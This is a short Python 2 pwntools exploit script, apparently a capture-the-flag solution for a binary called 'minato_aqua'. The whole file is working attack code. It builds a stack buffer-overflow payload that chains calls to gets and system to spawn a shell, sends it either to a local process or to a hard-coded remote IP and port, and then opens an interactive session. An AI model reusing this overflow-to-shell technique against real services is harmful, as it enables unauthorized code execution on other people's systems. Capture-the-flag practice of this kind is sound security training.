#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"
# context.log_level = 'DEBUG'

#libc = ELF('libc.so.6', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)       


e = ELF('minato_aqua')
elfROP = ROP(e)

cmd = """
b *0x000000000040120F
"""
# if(len(argv) == 3):
#     gdb.attach(p, cmd)



if(len(argv) == 2):
    p = connect("167.172.88.66", 8001)
else:
    p = process('./minato_aqua')
    # p = gdb.debug('./minato_aqua', cmd)



pload = ""
# pload += asm("pop rdi")
pload += ("A" *( 0x20 - len(pload)))
pload += "B" * 8
# pload += "B" * 8
pload += p64(e.symbols['gets'])
pload += p64(e.symbols['system'])
# pload += p64(0x000000000040110c)
p.sendline(pload)
sleep(1)
p.sendline('(/bio/sh)\x00')
# p.sendline('/bin/sh\x00')
p.interactive()